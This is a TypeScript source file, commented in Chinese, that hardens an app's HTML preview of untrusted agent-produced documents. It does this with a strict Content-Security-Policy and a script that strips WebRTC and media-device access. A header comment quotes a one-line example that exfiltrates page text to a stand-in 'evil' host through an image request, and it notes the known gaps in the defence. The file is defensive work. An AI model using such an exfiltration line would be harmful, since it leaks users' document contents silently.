/**
 * 给 CanvasPane 的 HTML 预览注入 CSP（移植 Cindy htmlPreviewCsp，含其实测结论）。
 *
 * 预览的是 agent 产出、可能受提示注入影响的不可信文档，而渲染态要保留 JavaScript
 * （交互型产物依赖）。onShouldStartLoadWithRequest/webRequest 只管导航，不经过子资源
 * 请求——`new Image().src='https://evil/?d='+encodeURIComponent(document.body.innerText)`
 * 会在打开预览的瞬间静默外传，导航回调一无所知。出网必须由渲染引擎强制关闭：
 * meta CSP 关掉 CSP 管得到的全部出口（子资源/fetch/XHR/表单/frame/插件）。
 * 刻意代价：预览里公网 https 图片/字体/脚本不再加载（放行即留外传通道）。
 *
 * ⚠️ 实测结论（Cindy 踩坑，勿凭 spec 推翻）：
 * 1. WebRTC 不受 CSP 各 *-src 指令管辖；`webrtc 'block'` 实测在 Chromium 上两种下发
 *    方式都不生效（装饰品，保留等引擎实现）。实际封锁只来自下面的 guard 删构造函数，
 *    而 guard 只作用于顶层 realm。
 * 2. `frame-src 'none'` 管的是 frame 导航；无 src 的 iframe 同步得到初始 about:blank
 *    子上下文（不发生 fetch、CSP 不介入），`window[0]` 可取到未加固 realm——文档层
 *    无法对不可信 HTML 完全闭合，完整闭合只有关 JS（产品取舍，此处不擅自决定）。
 */

/** 预览策略：默认全拒；'self' 放行本地相对资源（longma-file 同源 css/js），connect 关死。 */
export const HTML_PREVIEW_CSP = [
  "default-src 'none'",
  "img-src 'self' data:",
  "media-src 'self' data:",
  "font-src 'self' data:",
  "style-src 'self' 'unsafe-inline' data:",
  "script-src 'self' 'unsafe-inline' data:",
  "worker-src 'none'",
  "connect-src 'none'",
  "form-action 'none'",
  "base-uri 'none'",
  "frame-src 'none'",
  "object-src 'none'",
  // 实测未生效（见头注 1），保留等引擎落地；未实现指令被忽略、零副作用。
  "webrtc 'block'",
].join('; ');

const CSP_META = `<meta http-equiv="Content-Security-Policy" content="${HTML_PREVIEW_CSP}">`;

/**
 * 设备与 WebRTC 能力剥离（必须是文档第一段脚本，由解析器保证先于作者脚本执行）。
 * 名单 × {实例, 原型} 两处一起盖（只盖实例挡不住 prototype.call 取出）；
 * 属性 writable/configurable 双 false 定死。子 realm 便捷取法（contentWindow）一并封，
 * 但 window[0] 索引取法封不住——见头注 2。脚本文本不得出现 </script> 字面量。
 */
const DEVICE_SURFACE_GUARD =
  '<script>(function(){' +
  'var freeze=function(o,k){try{Object.defineProperty(o,k,' +
  '{value:undefined,writable:false,configurable:false});}catch(e){}};' +
  'var both=function(k){freeze(navigator,k);' +
  'try{freeze(Navigator.prototype,k);}catch(e){}};' +
  'try{' +
  "['mediaDevices','getUserMedia','webkitGetUserMedia','mozGetUserMedia']" +
  '.forEach(both);' +
  "['RTCPeerConnection','webkitRTCPeerConnection','RTCDataChannel']" +
  '.forEach(function(k){freeze(window,k);});' +
  "if(typeof MediaDevices!=='undefined'&&MediaDevices.prototype)" +
  "{freeze(MediaDevices.prototype,'getUserMedia');}" +
  "['HTMLIFrameElement','HTMLFrameElement','HTMLObjectElement','HTMLEmbedElement']" +
  ".forEach(function(n){try{var C=window[n];if(C&&C.prototype){" +
  "['contentWindow','contentDocument'].forEach(function(k){" +
  'try{Object.defineProperty(C.prototype,k,' +
  '{get:function(){return null;},configurable:false});}catch(e){}});' +
  '}}catch(e){}});' +
  '}catch(e){}})();</scr' +
  'ipt>';

/** 自前置标准模式 + CSP + 能力剥离。不去定位作者 doctype/<head>：前导 token 开放集合
 *  手写解析必漏；自前置后原文 doctype 被解析器忽略（无副作用），meta CSP 在任何作者
 *  内容之前生效（唯一安全位置）。BOM 前移防游离字符。 */
export function withHtmlPreviewCsp(html: string): string {
  const prolog = `<!doctype html><meta charset="utf-8">${CSP_META}${DEVICE_SURFACE_GUARD}`;
  if (html.charCodeAt(0) === 0xfeff) return `\uFEFF${prolog}${html.slice(1)}`;
  return `${prolog}${html}`;
}
